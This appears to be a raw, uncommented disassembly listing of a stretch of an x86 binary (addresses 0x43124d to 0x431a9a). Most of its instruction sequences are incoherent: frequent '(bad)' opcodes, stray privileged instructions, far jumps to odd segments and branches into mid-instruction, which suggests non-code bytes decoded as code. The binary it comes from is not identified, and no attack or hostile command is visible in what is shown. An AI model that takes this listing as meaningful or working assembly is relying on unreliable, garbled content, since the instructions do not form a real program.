  43124d:	mov    eax,0x824f89
  431252:	inc    edi
  431253:	mov    DWORD PTR [edx+0x64],ebp
  431256:	inc    WORD PTR [ebp-0x75]
  43125a:	(bad)  
  43125b:	data16 rol BYTE PTR [ebp-0x16001a],1
  431262:	inc    ebp
  431263:	jge    0x431244
  431265:	add    bh,ah
  431267:	lea    ax,[ebp-0x750030]
  43126e:	add    al,0x46
  431271:	jmp    0x40ff:0x8885
  431277:	push   DWORD PTR [ebp+0x52]
  43127a:	lea    eax,[eax]
  43127c:	shl    BYTE PTR [esi-0x7b],1
  43127f:	test   esi,edi
  431281:	(bad)  
  431282:	(bad)  
  431283:	inc    DWORD PTR [ebp-0x990140]
  431289:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  43128f:	inc    edi
  431290:	push   ecx
  431291:	xor    ax,WORD PTR [ebp-0x8d0045]
  431298:	add    al,al
  43129a:	ret    
  43129b:	mov    ax,WORD PTR [ebp-0x3f0004]
  4312a2:	push   eax
  4312a3:	mov    DWORD PTR [ebp-0x77],0xff98748b
  4312aa:	add    BYTE PTR [ebx-0x764f8839],al
  4312b0:	push   DWORD PTR [esi+0x1]
  4312b3:	inc    DWORD PTR [eax]
  4312b5:	mov    eax,0xff99ff
  4312ba:	or     BYTE PTR [ecx-0x7a87bb],cl
  4312c0:	jne    0x43127a
  4312c2:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
  4312cc:	mov    ecx,0xd74fb8
  4312d1:	add    cl,al
  4312d3:	mov    DWORD PTR [ecx-0x3f007784],ecx
  4312d9:	or     DWORD PTR [ebx+0x558966dc],0x7e
  4312e0:	(bad)  
  4312e1:	push   ebp
  4312e3:	mov    eax,0x8c2789
  4312e8:	ret    0x6689
  4312eb:	adc    BYTE PTR [ebp+0x48],0x8d
  4312ef:	add    bh,ah
  4312f1:	mov    WORD PTR [ebp-0x70],ax
  4312f5:	(bad)  
  4312f6:	ret    0x667d
  4312f9:	or     BYTE PTR [ebp-0x77],dl
  4312fc:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431303:	loop   0x43128e
  431305:	(bad)  
  431306:	xchg   esi,eax
  431307:	aam    0xcf
  431309:	out    dx,al
  43130a:	mov    DWORD PTR [esi-0x68],edi
  43130d:	inc    ebp
  43130e:	dec    edx
  43130f:	pop    ecx
  431310:	mov    edx,DWORD PTR [eax]
  431312:	repnz push bp
  431315:	or     BYTE PTR [ebx+0x55106638],0x49
  43131c:	(bad)  
  43131d:	repnz xor eax,0xa0898945
  431323:	mov    ah,0x89
  431325:	jmp    DWORD PTR [edx+0x66b0418d]
  43132b:	inc    DWORD PTR [ebp+0x50]
  43132e:	add    DWORD PTR [ebp-0x5],0xffffffbe
  431332:	mov    DWORD PTR [eax],ecx
  431334:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431335:	pop    es
  431336:	inc    ecx
  431337:	(bad)  
  431338:	data16 fwait
  43133a:	inc    ebp
  43133b:	xor    ah,BYTE PTR [esi+0x3]
  43133e:	dec    ebp
  43133f:	push   eax
  431340:	inc    bp
  431342:	jge    0x4312c7
  431344:	mov    esp,DWORD PTR [esi-0x18]
  431347:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  43134d:	add    DWORD PTR [ebx],esi
  43134f:	add    BYTE PTR [ebx],al
  431351:	test   DWORD PTR [ebx],esi
  431353:	(bad)  
  431354:	inc    WORD PTR [ebp+0x0]
  431358:	mov    eax,DWORD PTR [eax]
  43135a:	call   0x8898ca8f
  43135f:	mov    esi,eax
  431361:	clc    
  431362:	ret    
  431363:	rol    cl,0xa
  431366:	mov    DWORD PTR ds:0x7c0ec88,esi
  43136c:	mov    edx,edi
  43136e:	pushf  
  43136f:	pop    es
  431370:	jmp    FWORD PTR [edx+0x66]
  431373:	add    BYTE PTR [ebp-0x990175],al
  431379:	inc    ebp
  43137a:	test   DWORD PTR [ebx-0x2f00f202],eax
  431380:	push   ebp
  431381:	mov    edi,eax
  431383:	mov    dh,BYTE PTR [eax+0x266ff51]
  431389:	push   ebp
  43138a:	add    BYTE PTR [ebx-0x764b0777],al
  431390:	dec    DWORD PTR [esi+0x661851e8]
  431396:	add    BYTE PTR [ebp-0x7b],dl
  431399:	cmp    esi,0xfffffffb
  43139c:	dec    DWORD PTR [ecx+0x51fe9285]
  4313a2:	jmp    DWORD PTR [esi-0x75]
  4313a5:	push   ebp
  4313a6:	hlt    
  4313a7:	data16 (bad) 
  4313a9:	dec    ebp
  4313aa:	ret    
  4313ab:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  4313b1:	lea    edx,[eax-0x1]
  4313b4:	jne    0x431387
  4313b6:	dec    DWORD PTR [ecx-0x2f7a63f8]
  4313bc:	dec    BYTE PTR [ecx+0x51559eff]
  4313c2:	mov    DWORD PTR [esi-0x4c],esp
  4313c5:	push   ebp
  4313c6:	jmp    DWORD PTR [esi-0x18]
  4313c9:	inc    ebp
  4313ca:	sbb    BYTE PTR [ebp-0x767ad900],cl
  4313d0:	(bad)  
  4313d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4313d2:	inc    eax
  4313d4:	test   DWORD PTR [esi-0x2],esp
  4313d7:	inc    ebp
  4313d8:	dec    DWORD PTR [ebp-0x760bde75]
  4313de:	(bad)  
  4313df:	test   al,0xc3
  4313e1:	mov    DWORD PTR [ebp-0x769b56],ecx
  4313e7:	lods   al,BYTE PTR ds:[esi]
  4313e8:	push   eax
  4313e9:	inc    ebp
  4313ea:	jne    0x4313fb
  4313ec:	dec    DWORD PTR [ebp+0x8]
  4313ef:	mov    ecx,DWORD PTR [ebx]
  4313f1:	sbb    al,0x0
  4313f3:	(bad)  
  4313f4:	mov    eax,0xc14fc3
  4313f9:	mov    DWORD PTR [ecx-0xbabf64],ecx
  4313ff:	movsx  ecx,WORD PTR [ebp+0x4e]
  431403:	xor    eax,DWORD PTR [eax]
  431405:	add    eax,edi
  431407:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  43140d:	xor    edi,DWORD PTR [eax+0x854f66]
  431413:	dec    BYTE PTR [ecx-0x76bb01]
  431419:	mov    BYTE PTR [ebx-0x76724001],al
  43141f:	pushf  
  431420:	inc    esi
  431421:	(bad)  
  431422:	dec    DWORD PTR [ebp-0x7abe6373]
  431428:	sar    esi,0x89
  43142b:	dec    DWORD PTR [eax+0x0]
  43142e:	inc    DWORD PTR [eax]
  431430:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  431437:	xlat   BYTE PTR ds:[ebx]
  431438:	dec    edx
  431439:	add    bh,bh
  43143b:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  431441:	lea    esp,[esi-0x50]
  431444:	(bad)  
  431445:	(bad)  
  431446:	call   DWORD PTR [eax-0x1]
  431449:	inc    ebp
  43144a:	rdpmc  
  43144c:	add    BYTE PTR [ebx],al
  43144e:	push   ax
  431450:	lea    eax,[ebp-0x1]
  431456:	js     0x431457
  431458:	add    al,bh
  43145a:	push   bp
  43145c:	lea    ecx,[ebp-0x7701]
  431462:	fmul   DWORD PTR [ebp-0x7a997800]
  431468:	(bad)  
  431469:	(bad)  
  43146a:	(bad)  
  43146b:	(bad)  
  43146c:	jmp    DWORD PTR [ecx-0x7676ffb3]
  431472:	dec    eax
  431473:	mov    eax,0x8d8dffff
  431478:	mov    al,0xb0
  43147a:	(bad)  
  43147b:	call   DWORD PTR [ecx+0x50]
  43147e:	dec    ebp
  43147f:	inc    ebp
  431480:	mov    esi,0x7030833
  431485:	push   eax
  431486:	into   
  431487:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  43148d:	call   DWORD PTR [ecx-0x8]
  431490:	lea    edx,[ebp-0x1]
  431493:	jmp    0x761697
  431498:	inc    eax
  431499:	jnp    0x431428
  43149b:	add    dh,bh
  43149d:	inc    WORD PTR [ebp-0x8a00b0]
  4314a4:	mov    edx,eax
  4314a6:	inc    esp
  4314a7:	add    bh,bh
  4314a9:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  4314af:	dec    DWORD PTR [ebx-0x7f820301]
  4314b5:	add    BYTE PTR [ecx],al
  4314b7:	data16 add BYTE PTR [ebp-0xb30077],al
  4314be:	inc    eax
  4314c0:	(bad)  
  4314c1:	dec    si
  4314c3:	test   edi,edi
  4314c5:	(bad)  
  4314c6:	cmp    edi,edi
  4314c8:	add    ecx,DWORD PTR [edi-0x39]
  4314cb:	mov    edx,DWORD PTR [edx+0x66]
  4314ce:	inc    DWORD PTR [ebp-0x3d00cb]
  4314d4:	mov    eax,0x66ff8b5e
  4314da:	jmp    0xb4ff:0xc7ff3895
  4314e1:	push   ecx
  4314e2:	inc    DWORD PTR [ebx-0x76ffccbb]
  4314e8:	call   DWORD PTR [esi-0x1]
  4314eb:	dec    DWORD PTR [eax]
  4314ed:	mov    ecx,0x805ff
  4314f2:	inc    ebp
  4314f3:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  4314f9:	mov    ecx,0x35784
  4314fe:	add    BYTE PTR [ecx-0xffa59b],cl
  431504:	inc    ebp
  431505:	mov    ecx,0x9c6131
  43150a:	(bad)  
  43150b:	mov    eax,ebx
  43150d:	pop    esp
  43150e:	test   edi,edi
  431510:	clc    
  431511:	lea    eax,[ebp-0x24]
  431514:	cmp    eax,0xc7fe9c8d
  431519:	push   eax
  43151b:	lea    eax,[ebp+0x45fff8fe]
  431521:	mov    esi,DWORD PTR [ecx]
  431523:	hlt    
  431524:	lahf   
  431525:	push   esp
  431526:	mov    edx,DWORD PTR [ecx-0x4]
  431529:	xor    eax,DWORD PTR [eax+0x7201bb]
  43152f:	add    BYTE PTR [ebp-0x35],al
  431532:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  431538:	mov    edx,DWORD PTR [ecx-0x74]
  43153b:	rol    BYTE PTR [eax],0x8d
  43153e:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  431542:	nop
  431543:	push   ecx
  431544:	add    bh,bh
  431546:	mov    esp,edi
  431548:	in     al,0x85
  43154a:	jge    0x43154a
  43154c:	test   edi,edi
  43154e:	jne    0x4314d5
  431550:	(bad)  
  431551:	(bad)  
  431552:	sbb    bh,bh
  431554:	push   ebp
  431555:	inc    ebp
  431556:	call   0xffdc0fe6
  43155b:	add    BYTE PTR [ebp+0x66],al
  43155e:	mov    edx,DWORD PTR [ebp-0xfc0075]
  431564:	cmp    al,0x85
  431566:	ud0    eax,DWORD PTR [ebp-0x1]
  43156a:	test   DWORD PTR [edi+0x74],ecx
  43156d:	dec    edi
  43156e:	inc    DWORD PTR [ebp-0x530004]
  431574:	dec    DWORD PTR [edi-0x75]
  431577:	dec    esi
  431578:	cld    
  431579:	test   DWORD PTR [eax+0xff01ff],eax
  43157f:	icebp  
  431580:	add    BYTE PTR [edi-0x3a],cl
  431583:	test   ebx,eax
  431585:	inc    BYTE PTR [ebp-0x1]
  431588:	jne    0x43158a
  43158a:	mov    eax,DWORD PTR [eax]
  43158c:	cld    
  43158d:	xor    BYTE PTR [ecx+0x500155],cl
  431593:	push   ebp
  431594:	xor    DWORD PTR [ecx+0x45011c80],ecx
  43159a:	add    BYTE PTR [ebp+0x35e90f50],al
  4315a0:	add    al,BYTE PTR [eax]
  4315a2:	add    BYTE PTR [ebx-0x38fe4f80],al
  4315a8:	add    ah,ch
  4315aa:	or     BYTE PTR [ebp+0x4501f845],dh
  4315b0:	jmp    0xdf18a6
  4315b5:	(bad)  
  4315b6:	nop    ecx
  4315b9:	test   DWORD PTR [ebp+0x4502f8],eax
  4315bf:	xor    ecx,DWORD PTR [ebp-0x64]
  4315c2:	mov    eax,edi
  4315c4:	mov    ebx,DWORD PTR [eax+edx*2]
  4315c7:	add    eax,0x45fef885
  4315cc:	dec    DWORD PTR [ebx+0x339445]
  4315d2:	add    ecx,DWORD PTR [ecx+0x4500f889]
  4315d8:	dec    DWORD PTR [ebx-0x460f0375]
  4315de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4315df:	add    esi,edi
  4315e1:	add    bh,bh
  4315e3:	rdpmc  
  4315e5:	add    BYTE PTR [ebx],0x1
  4315e8:	mov    DWORD PTR [eax],eax
  4315ea:	add    al,0x45
  4315ec:	dec    DWORD PTR [ecx-0x360b3373]
  4315f2:	dec    DWORD PTR [esi]
  4315f4:	push   eax
  4315f5:	jne    0x43163c
  4315f7:	mov    esi,DWORD PTR [ebx]
  4315f9:	cld    
  4315fa:	add    esp,ecx
  4315fc:	push   eax
  4315fd:	inc    DWORD PTR [ebp-0x75]
  431600:	add    eax,0x800e4
  431605:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43160b:	mov    DWORD PTR [ecx],eax
  43160d:	sbb    al,0x0
  43160f:	leave  
  431610:	test   DWORD PTR [edi-0x2],eax
  431613:	jne    0x431614
  431615:	call   0xff44001a
  43161a:	xor    BYTE PTR [ebp+0x4d],al
  43161d:	mov    edi,edi
  43161f:	enter  0x8,0x4d
  431623:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  431629:	mov    eax,DWORD PTR [eax]
  43162b:	cld    
  43162c:	add    DWORD PTR [ecx],ebx
  43162e:	inc    ebp
  43162f:	dec    ebp
  431630:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  431636:	inc    eax
  431637:	dec    DWORD PTR [ecx-0x270375]
  43163d:	add    BYTE PTR [ebx-0x39d72701],cl
  431643:	xchg   ecx,eax
  431644:	ret    
  431645:	add    BYTE PTR [ebp-0x830075],al
  43164b:	add    BYTE PTR [ebp-0x75],al
  43164e:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  431654:	lea    edi,[edi-0xc]
  431657:	add    bh,bh
  431659:	mov    edx,DWORD PTR [eax-0x7b]
  43165c:	inc    ebp
  43165d:	rdpmc  
  43165f:	jne    0x431664
  431661:	add    BYTE PTR [eax-0x75],dl
  431664:	inc    ebp
  431665:	clc    
  431666:	add    eax,0x400009
  43166b:	mov    DWORD PTR [ebx-0x7f000304],ecx
  431671:	mov    eax,DWORD PTR [ecx]
  431673:	in     al,dx
  431674:	add    dh,al
  431676:	test   ebx,eax
  431678:	inc    BYTE PTR [ebp-0xff0001]
  43167e:	add    BYTE PTR [ebp-0x43],al
  431681:	cmp    esi,0xfffffff8
  431684:	(bad)  
  431685:	push   DWORD PTR [eax]
  431687:	add    BYTE PTR [ebp-0x3a],dl
  43168a:	test   ebx,eax
  43168c:	je     0x431613
  43168e:	mov    edi,edi
  431690:	sbb    al,0xff
  431692:	test   DWORD PTR gs:[eax],eax
  431695:	(bad)  
  431696:	js     0x431697
  431698:	add    BYTE PTR [ebx-0x39b20bdd],cl
  43169e:	sub    eax,ebx
  4316a0:	mov    ecx,DWORD PTR [ebx-0x55130377]
  4316a6:	add    eax,DWORD PTR [eax]
  4316a8:	dec    ebp
  4316a9:	push   eax
  4316aa:	mov    al,BYTE PTR [ebp+0x1]
  4316ad:	mov    eax,DWORD PTR [ebp-0x68]
  4316b0:	mov    eax,DWORD PTR [eax]
  4316b2:	sbb    bh,al
  4316b4:	or     ah,dh
  4316b6:	dec    ebp
  4316b7:	inc    DWORD PTR [eax+0x4]
  4316ba:	push   ecx
  4316bb:	add    BYTE PTR [edx-0x1],dh
  4316be:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  4316c4:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  4316ce:	add    ecx,DWORD PTR [ecx-0x1be77477]
  4316d4:	push   ecx
  4316d5:	cmp    BYTE PTR [ebx],al
  4316d7:	inc    ebp
  4316d8:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  4316de:	(bad)  
  4316df:	(bad)  
  4316e0:	in     al,0xff
  4316e2:	add    BYTE PTR [ebp+0x0],al
  4316e5:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4316eb:	add    al,bh
  4316ed:	(bad)  
  4316ee:	jmp    0x8d85:0x74b0558d
  4316f5:	dec    DWORD PTR [eax]
  4316f7:	call   DWORD PTR [ebp-0x7b]
  4316fa:	mov    edi,esi
  4316fc:	lock call DWORD PTR [ebp-0x75]
  431700:	mov    esi,esp
  431702:	mov    ah,0xc6
  431704:	mov    bh,0xc3
  431706:	mov    DWORD PTR [ebx-0x110003c4],ecx
  43170c:	add    DWORD PTR [eax],0x450050ff
  431712:	mov    DWORD PTR [ebx+0x9598cc],ecx
  431718:	inc    edi
  43171a:	push   esp
  43171c:	jmp    0xcd00:0x650481ff
  431723:	mov    DWORD PTR [ebx],esi
  431725:	clc    
  431726:	cmp    edi,0xff9cff3c
  43172c:	jne    0x431736
  43172e:	mov    eax,eax
  431730:	add    esi,DWORD PTR [eax]
  431732:	int3   
  431733:	inc    ebp
  431734:	cmp    al,0x83
  431736:	add    BYTE PTR [eax],bl
  431738:	adc    DWORD PTR [ebx+0x768b5055],eax
  43173e:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  431744:	mov    edi,eax
  431746:	cmp    BYTE PTR [ebp+0x45],cl
  431749:	jmp    0x4316d6
  43174b:	mov    ebx,DWORD PTR [esp+ebp*8]
  43174e:	inc    ebp
  43174f:	or     al,0x2
  431751:	dec    DWORD PTR [ebp+0x18]
  431754:	jne    0x4317ab
  431756:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  43175c:	mov    edi,DWORD PTR [ebx]
  43175e:	in     al,0x50
  431760:	xchg   ecx,eax
  431761:	jmp    0x3436666
  431766:	adc    al,0x8b
  431768:	inc    ebp
  431769:	mov    al,ds:0x8b04008b
  43176e:	push   ebp
  43176f:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  431775:	push   ebp
  431776:	test   DWORD PTR [ebx-0x2800d701],ecx
  43177c:	inc    ebp
  43177d:	dec    ebp
  43177e:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431784:	mov    DWORD PTR [eax],0xe9ff00f4
  43178a:	add    al,0x0
  43178c:	add    BYTE PTR [eax],al
  43178e:	mov    eax,edx
  431790:	push   eax
  431791:	rol    DWORD PTR [ebp-0xf0177],1
  431797:	bound  eax,QWORD PTR [ebp+0x50]
  43179a:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4317a0:	add    BYTE PTR [ecx+0x558df0ff],cl
  4317a6:	mov    al,0xf
  4317a8:	test   DWORD PTR [edx],edx
  4317aa:	call   DWORD PTR [ebp-0x7a0001]
  4317b0:	(bad)  
  4317b1:	loop   0x4317b2
  4317b3:	jnp    0xc6990bb9
  4317b9:	mov    eax,ebx
  4317bb:	cmp    al,0x8b
  4317bd:	(bad)  
  4317be:	cld    
  4317bf:	shr    esi,0xc
  4317c2:	add    dl,al
  4317c4:	push   eax
  4317c5:	lea    eax,[ebp-0x1]
  4317c8:	mov    edx,esi
  4317ca:	cwde   
  4317cb:	cli    
  4317cc:	add    BYTE PTR [ebp+0x1ffff8ff],al
  4317d2:	or     BYTE PTR [eax],cl
  4317d4:	inc    ebp
  4317d5:	dec    ebp
  4317d6:	inc    DWORD PTR [ebx+0x74803914]
  4317dc:	add    DWORD PTR [ebx+0x451800],ecx
  4317e2:	call   DWORD PTR [eax+edx*1]
  4317e5:	add    ecx,DWORD PTR [ebp-0x34]
  4317e8:	push   edi
  4317e9:	adc    al,0x8
  4317eb:	mov    edx,DWORD PTR [ebp-0x14]
  4317ee:	mov    ecx,DWORD PTR [ebp+0x18]
  4317f1:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  4317f5:	inc    DWORD PTR [eax+esi*8]
  4317f8:	inc    ebp
  4317f9:	stos   BYTE PTR es:[edi],al
  4317fa:	mov    edx,DWORD PTR [ebp-0x4]
  4317fd:	add    DWORD PTR [ebp-0x1c],eax
  431800:	mov    edx,DWORD PTR [ebp-0x70]
  431803:	cmp    eax,DWORD PTR [eax]
  431805:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431806:	mov    eax,DWORD PTR [eax]
  431808:	cld    
  431809:	jae    0x43178b
  43180b:	add    eax,DWORD PTR [ecx]
  43180d:	clc    
  43180e:	add    BYTE PTR [eax+0x30],dl
  431811:	mov    DWORD PTR [ecx],esi
  431813:	clc    
  431814:	pop    ds
  431815:	inc    ebp
  431816:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  43181c:	(bad)  
  43181d:	push   DWORD PTR [edi]
  43181f:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  431825:	(bad)  
  431826:	jae    0x431827
  431828:	mov    eax,DWORD PTR [ebp-0x740175]
  43182e:	sub    eax,DWORD PTR [eax]
  431830:	add    eax,DWORD PTR [eax]
  431832:	mov    DWORD PTR [ecx+0x5f],eax
  431835:	mov    DWORD PTR [ebx-0x4],ebx
  431838:	ret    0xff
  43183b:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  431841:	ret    
  431842:	mov    eax,DWORD PTR [ebp-0x6f0075]
  431848:	add    BYTE PTR [ebp-0x7d],al
  43184b:	mov    DWORD PTR [eax],eax
  43184d:	add    al,0x84
  43184f:	inc    DWORD PTR [ecx]
  431851:	lea    eax,[eax]
  431853:	hlt    
  431854:	sar    bh,cl
  431856:	test   BYTE PTR [eax+0x1],dl
  431859:	inc    ebp
  43185a:	add    BYTE PTR [ebx],dh
  43185c:	test   BYTE PTR [ebx],0x84
  43185f:	push   eax
  431860:	add    BYTE PTR [ebp+0x0],al
  431863:	add    eax,0x86
  431868:	add    BYTE PTR [ebx-0x7f7b0340],cl
  43186e:	add    BYTE PTR [ecx],al
  431870:	add    BYTE PTR [eax],al
  431872:	mov    esi,0x550030
  431877:	mov    ecx,DWORD PTR [edi]
  431879:	cld    
  43187a:	fidiv  DWORD PTR [ebp+0x0]
  43187d:	mov    edi,DWORD PTR [ecx]
  43187f:	xor    BYTE PTR [eax+eax*1],0x84
  431883:	add    eax,DWORD PTR [eax]
  431885:	sbb    BYTE PTR [eax],al
  431887:	jne    0x43183a
  431889:	mov    eax,DWORD PTR [ecx]
  43188b:	sbb    BYTE PTR [eax],al
  43188d:	mov    DWORD PTR [ebp-0x1],esp
  431890:	add    BYTE PTR [eax+0x30e45ca],bh
  431896:	ret    0xb7fc
  431899:	dec    ebp
  43189a:	or     al,0x89
  43189c:	dec    ebp
  43189d:	cld    
  43189e:	cmovne ecx,DWORD PTR [eax-0x75]
  4318a2:	add    edi,esp
  4318a4:	seto   BYTE PTR [esi-0x72ffffff]
  4318ab:	inc    ebp
  4318ac:	adc    al,0x8b
  4318ae:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  4318b5:	cmp    DWORD PTR [edi+0x72],edx
  4318b8:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  4318be:	gs cmp al,0x0
  4318c1:	je     0x431899
  4318c3:	push   eax
  4318c4:	sar    BYTE PTR [eax],1
  4318c6:	mov    bh,0x3e
  4318c8:	push   cs
  4318c9:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  4318cf:	add    DWORD PTR [ecx+0x12],ebp
  4318d2:	dec    edx
  4318d3:	(bad)  
  4318d4:	mov    eax,edx
  4318d6:	in     al,dx
  4318d7:	adc    DWORD PTR [ecx],esi
  4318d9:	pop    esi
  4318da:	inc    ecx
  4318db:	leave  
  4318dc:	or     DWORD PTR [eax],ebx
  4318de:	gs push ebp
  4318e0:	add    ah,ch
  4318e2:	into   
  4318e3:	in     al,dx
  4318e4:	enter  0xb756,0xf0
  4318e8:	push   cs
  4318e9:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  4318f3:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  4318f9:	jnp    0x74439e01
  4318ff:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431905:	add    BYTE PTR [edi],cl
  431907:	mov    edi,DWORD PTR [ecx-0x78]
  43190a:	ltr    WORD PTR [ecx-0x7b]
  43190e:	dec    DWORD PTR [edi]
  431910:	clc    
  431911:	out    0x45,eax
  431913:	add    BYTE PTR [eax],cl
  431915:	cmp    ebx,0xffffff8c
  431918:	jge    0x43191a
  43191a:	jb     0x43192c
  43191c:	je     0x52199c
  431922:	pop    edx
  431923:	push   esi
  431924:	mov    ecx,DWORD PTR [edi]
  431926:	in     al,dx
  431927:	rol    DWORD PTR [ebp+0x0],1
  43192a:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431931:	cmp    DWORD PTR [ecx],0xfffffff0
  431934:	hlt    
  431935:	mov    esp,DWORD PTR [eax+0xf034d2b]
  43193b:	(bad)  
  43193d:	push   eax
  43193e:	jns    0xb842fdbc
  431944:	lock push cs
  431946:	ror    edx,0x3
  431949:	test   BYTE PTR [ecx+0x5500e800],cl
  43194f:	dec    eax
  431950:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431954:	(bad)  
  431955:	mov    esi,0x7f33ff5f
  43195a:	inc    eax
  43195b:	test   DWORD PTR [edx],eax
  43195d:	je     0x43191f
  43195f:	mov    ecx,ecx
  431961:	adc    DWORD PTR [ebp-0xc],0xffffffec
  431965:	and    eax,DWORD PTR [eax+0xf0103]
  43196b:	jp     0x431959
  43196d:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  431971:	add    edx,DWORD PTR [edi+0x74]
  431974:	sbb    BYTE PTR [ebp+0x4d001484],cl
  43197a:	add    BYTE PTR [ebp-0x74c48bbb],al
  431980:	je     0x431905
  431982:	cmp    eax,edi
  431984:	js     0x4319a9
  431986:	add    eax,0xeb0fc003
  43198b:	jns    0x431918
  43198d:	vmread DWORD PTR [ecx+0x45],ebx
  431991:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  431997:	adc    al,0x8b
  431999:	jge    0x4319af
  43199b:	mov    edi,DWORD PTR [eax-0x4]
  43199e:	add    edi,DWORD PTR [edi]
  4319a0:	or     bh,bh
  4319a2:	push   ebp
  4319a3:	push   es
  4319a4:	mov    DWORD PTR [ebp-0x4],ebx
  4319a7:	add    edi,esi
  4319a9:	pop    es
  4319aa:	add    esi,DWORD PTR [edi-0x48ccf183]
  4319b0:	mov    DWORD PTR [esp+esi*8],ecx
  4319b3:	inc    ebp
  4319b4:	pop    ebp
  4319b5:	xor    DWORD PTR [esi-0x4],0x3b
  4319b9:	add    edx,DWORD PTR [ecx+edi*1]
  4319bc:	push   es
  4319bd:	clc    
  4319be:	mov    bh,0xdb
  4319c0:	jp     0x431979
  4319c2:	add    cl,BYTE PTR [esi]
  4319c4:	div    DWORD PTR [edi+0x4d8b0c1c]
  4319ca:	test   edi,edi
  4319cc:	je     0x4319c2
  4319ce:	mov    eax,ecx
  4319d0:	or     BYTE PTR [ebx],al
  4319d2:	dec    BYTE PTR [ecx+0x7d3bec7d]
  4319d8:	jbe    0x431a4c
  4319da:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  4319e0:	add    ecx,DWORD PTR [esi]
  4319e2:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  4319e8:	add    eax,DWORD PTR [ebx-0x287af783]
  4319ee:	je     0x431a3d
  4319f0:	mov    DWORD PTR [ecx],edi
  4319f2:	mov    esi,eax
  4319f4:	hlt    
  4319f5:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  4319fc:	jb     0x4319be
  4319fe:	jmp    0x4319eb
  431a00:	xor    esi,DWORD PTR [ebx]
  431a02:	pop    edi
  431a03:	pop    esi
  431a04:	pop    ebx
  431a05:	ret    
  431a06:	ret    0x8b
  431a09:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431a0f:	xor    DWORD PTR [ecx],0xc
  431a12:	pushf  
  431a13:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431a19:	rdmsr  
  431a1b:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431a22:	dec    ebp
  431a23:	ret    
  431a24:	mov    edi,DWORD PTR [esi-0x4]
  431a27:	pop    eax
  431a28:	dec    ebp
  431a29:	jne    0x4319b6
  431a2b:	xor    edi,esp
  431a2d:	inc    eax
  431a2e:	dec    ebp
  431a2f:	jbe    0x431a84
  431a31:	inc    eax
  431a32:	pop    ebp
  431a33:	add    edx,DWORD PTR [esi+0x8]
  431a36:	push   esp
  431a37:	dec    eax
  431a38:	push   ecx
  431a39:	mov    eax,edi
  431a3b:	and    al,0xf0
  431a3d:	jo     0x431a2a
  431a3f:	mov    eax,DWORD PTR [ebx]
  431a41:	sbb    BYTE PTR [ebp+0x4d],cl
  431a44:	mov    eax,DWORD PTR [ebx]
  431a46:	nop
  431a47:	or     BYTE PTR [eax],al
  431a49:	jne    0x431aa2
  431a4b:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431a51:	cld    
  431a52:	xor    edi,edi
  431a54:	add    edi,DWORD PTR [ebp+0x3]
  431a57:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431a5d:	js     0x4319e3
  431a5f:	jae    0x431a63
  431a61:	(bad)  
  431a63:	xor    al,0x5d
  431a65:	jmp    0x4319f2
  431a67:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431a6e:	fdecstp 
  431a70:	test   BYTE PTR [edi],ah
  431a72:	add    bh,BYTE PTR [ebp+0x0]
  431a75:	add    ebx,DWORD PTR [ebp-0x77]
  431a78:	mov    edi,eax
  431a7a:	cmp    al,0x0
  431a7d:	adc    dh,BYTE PTR [ebx]
  431a7f:	jge    0x431a84
  431a81:	mov    edi,DWORD PTR [ebx]
  431a83:	jl     0x431a94
  431a85:	clc    
  431a86:	dec    edi
  431a87:	jge    0x431a89
  431a89:	mov    eax,DWORD PTR [ebx]
  431a8b:	jb     0x431a95
  431a8d:	mov    ecx,DWORD PTR [ebp-0x8]
  431a90:	mov    edi,edi
  431a92:	xor    edx,DWORD PTR [eax]
  431a94:	add    edi,DWORD PTR [ebx]
  431a96:	mov    DWORD PTR [ebp-0x10],edi
  431a99:	inc    edi
  431a9a:	pop    ebp
